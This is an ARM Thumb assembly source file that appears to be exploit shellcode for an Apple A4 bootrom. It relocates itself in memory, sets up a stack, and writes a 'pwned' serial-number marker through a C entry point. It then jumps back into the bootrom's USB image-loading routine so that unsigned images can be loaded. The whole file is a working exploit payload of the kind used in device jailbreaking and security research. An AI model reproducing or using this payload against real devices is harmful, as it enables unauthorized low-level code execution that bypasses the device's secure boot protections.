.text

.pool
@ usb_wait_for_image call offset
@ A4 only
.set    RET_ADDR,            0x7ef
@.set    RET_ADDR,           0x4c85
.set    loadaddr,            0x84000000
.set    maxsize,            0x24000
.set    memmove,             0x84dc

@ Relocate the shellcode to somewhere above the documented A4 memory map
.set    relocated_payload_addr, 0x8403d000
.set    relocated_payload_size, 1024
@ Reset the stack pointer back to the top of the main stack
.set    stack_address, 0x8403c000

.extern _c_entry_point
.code 16
_start: .global _start
	B	entry_point
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP

entry_point:

relocate_shellcode:
    mov r1, pc
    sub r1, r1, #4
    ldr r0, =relocated_payload_addr

    cmp r0, r1
    beq continue_relocated

    @ Relocate the payload now
    ldr r2, =relocated_payload_size
    ldr r3, =memmove
    @ memmove(relocated_payload_addr, pc_base, relocated_payload_size)
    blx r3

    ldr r3, =relocated_payload_addr
    @ THUMB
    add r3, r3, #1
    @ Jump to relocated shellcode
    bx r3

.align 4
continue_relocated:
    @ Set up a stack
    ldr r0, =stack_address
    mov sp, r0

    mov r2, pc
    adr r0, pwned_serial
    mov r1, pwned_serial_len
    mov r3, sp
    BL _c_entry_point

    LDR    R0,    =loadaddr
    LDR    R1,    =maxsize
    MOV    R2,    #0    
    LDR    R3,    =RET_ADDR
    BLX    R3

.align 2
pwned_serial:
.asciz "[Overwritten serial number!]"
@pwned_serial_len:
@ .equ . - pwned_serial
pwned_serial_len = . - pwned_serial

